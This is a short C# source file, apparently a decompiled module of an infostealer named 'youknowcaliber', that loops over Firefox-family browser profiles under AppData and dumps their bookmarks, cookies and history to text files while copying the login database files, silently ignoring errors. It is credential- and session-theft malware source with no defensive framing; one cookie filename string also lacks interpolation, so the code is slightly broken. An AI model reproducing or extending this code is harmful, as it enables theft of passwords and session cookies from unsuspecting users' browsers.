﻿using System;
using System.Collections.Generic;
using System.IO;
using youknowcaliber.Bookmarks;
using youknowcaliber.Cookies;
using youknowcaliber.History;
using youknowcaliber.Passwords;

namespace youknowcaliber.Firefox
{
	internal class Recovery
	{
		public static void Run(string sSavePath)
		{
			foreach (string text in Paths.sGeckoBrowserPaths)
			{
				try
				{
					string name = new DirectoryInfo(text).Name;
					string text2 = sSavePath + "\\" + name;
					string text3 = Paths.appdata + "\\" + text;
					bool flag = Directory.Exists(text3 + "\\Profiles");
					if (flag)
					{
						Directory.CreateDirectory(text2);
						List<Bookmark> bBookmarks = cBookmarks.Get(text3);
						List<Cookie> cCookies = cCookies.Get(text3);
						List<Site> sHistory = cHistory.Get(text3);
						cBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
						cBrowserUtils.WriteCookies(cCookies, sSavePath + "\\Cookies_Firefox({GenStrings.GenNumbersTo()}).txt");
						cBrowserUtils.WriteHistory(sHistory, text2 + "\\History.txt");
						cLogins.GetDBFiles(Paths.appdata + text + "\\Profiles\\", text2);
					}
				}
				catch
				{
				}
			}
		}
	}
}
